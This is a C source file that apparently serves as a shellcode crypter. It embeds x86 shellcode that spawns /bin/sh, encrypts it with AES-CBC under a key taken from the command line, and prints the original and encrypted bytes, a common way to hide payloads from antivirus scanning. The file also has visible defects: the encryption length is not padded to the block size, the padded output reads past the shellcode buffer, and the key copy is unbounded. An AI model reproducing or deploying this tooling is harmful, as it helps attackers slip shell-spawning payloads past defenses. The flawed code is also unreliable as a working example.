#include <stdio.h>
#include <string.h>
#include <stdint.h>

// Enabling CBC must be done before including aes.h or at compile-time.
// For compile time, use -DCBC=1
#define CBC 1

#include "aes.h"

// execve /bin/sh
uint8_t shellcode[] = "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

void printHex(uint8_t* buffer, size_t size) {
    for (int i = 0; i < size; i++) {
        printf("\\x%02X", buffer[i]);
    }
    printf("\n");
}


void encrypt(char* givenKey, size_t size) {
    uint8_t key[32] = { 0 };
    uint8_t iv[]  = { 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f };
    struct AES_ctx ctx;

    printf("\nEncrypting...");

    memcpy(key, givenKey, strlen(givenKey));
    AES_init_ctx_iv(&ctx, key, iv);
    AES_CBC_encrypt_buffer(&ctx, shellcode, size);

    printf("Done!\n");
}


int main(int argc, char* argv[])
{
    size_t shellcodeSize = sizeof(shellcode) - 1; // disregard null terminator
    size_t encryptedSize = (16 - (shellcodeSize % 16) + shellcodeSize); // account for padding
    printf("Original Shellcode:\n");
    printHex(shellcode, shellcodeSize);

    encrypt(argv[1], shellcodeSize);
    printf("\nEncrypted Shellcode:\n");
    printHex(shellcode, encryptedSize);

    return 0;
}
